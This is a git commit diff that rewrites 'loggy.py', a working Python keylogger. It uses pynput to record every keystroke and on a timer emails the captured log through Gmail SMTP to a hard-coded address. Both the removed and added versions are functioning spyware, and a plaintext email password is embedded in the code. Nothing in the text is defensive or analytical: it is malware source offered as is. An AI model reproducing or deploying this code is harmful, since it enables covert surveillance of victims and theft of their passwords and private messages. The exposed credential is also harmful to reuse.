7d980a6c19e34985f7d0de42300096ed22127c0e
Yash Saxena <35332582+YashSaxena75@users.noreply.github.com>
2019-06-25 15:30:24 +0530

    Update loggy.py

--- loggy.py
+++ loggy.py
@@ -1,73 +1,50 @@
-import pynput.keyboard, threading
-import smtplib,time
-from email import encoders
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
+import pynput.keyboard,threading,smtplib
 
-log = ""
-
-hiddenmodule=['pynput.keyboard','threading']
 
 class keylog:
 
-    def mail(self):
-        c=True
-        while c:
-            try:
-                fromaddr = "cyberbot1502@gmail.com"
-                toaddr = "cyberbot1502@gmail.com"
-                msg = MIMEMultipart()
-                msg['From'] = fromaddr
-                msg['To'] = toaddr
-                msg['Subject'] = "Log file"
-                body = "Log"
-                msg.attach(MIMEText(body, 'plain'))
-                filename = "logg.txt"
-                attachment = open(r"C:/Arb/logg.txt", "rb")
-                p = MIMEBase('application', 'octet-stream')
-                p.set_payload((attachment).read())
-                encoders.encode_base64(p)
-                p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
-                msg.attach(p)
-                s = smtplib.SMTP('smtp.gmail.com', 587)
-                s.starttls()
-                s.login(fromaddr, "Hexadecimalqwertyuiop")
-                text = msg.as_string()
-                s.sendmail(fromaddr, toaddr, text)
-                print("Mail Sent!")
-                c=False
-            except Exception as e:
-                time.sleep(5)
-                c=True
-                print(e)
+	def __init__(self,time_interval,email,password):
+		self.log="Started"
+		self.interval=time_interval
+		self.email=email
+		self.password=password
 
-    def pkp(self, key):
-        global log
-        try:
-            log = log + str(key.char)
-        except  Exception as e:
-            if key == key.space:
-                log = log + " "
-            else:
-                log = log + " " + str(key) + " "
 
-    def report(self):
 
-        global log
-        f = open(r'C:/Arb/logg.txt', 'a+')
-        f.write(log)
-        print(log)
-        self.mail()
-        log = ""
-        timer = threading.Timer(15, self.report)
-        timer.start()
+	def append_log(self,string):
+		self.log=self.log+string
 
-    def start(self):
-        kl = pynput.keyboard.Listener(on_press=self.pkp)
-        with kl:
-            self.report()
-            kl.join()
+	def pkp(self,key):
+		try:
+			ckey=str(key.char)
+		except  Exception as e:
+			if key==key.space:
+				ckey=" "
+			else:
+				ckey= " " + str(key) + " " 
 
-mlog=keylog()
+		self.append_log(ckey)
+
+	def report(self):
+
+		self.mail(self.email,self.password,"\n\n"+self.log)
+		self.log=""
+		timer=threading.Timer(self.interval,self.report)
+		timer.start()
+
+	def mail(self,email,password,message):
+		server=smtplib.SMTP('smtp.gmail.com',587)
+		server.starttls()
+		server.login(email,password)
+		server.sendmail(email,email,message)
+		server.quit()
+
+
+	def start(self):
+		kl=pynput.keyboard.Listener(on_press=self.pkp)
+		with kl:
+			self.report()
+			kl.join()
+
+mlog=keylog(120,'cyberbot1502@gmail.com','Hexadecimalqwertyuiop')
 mlog.start()
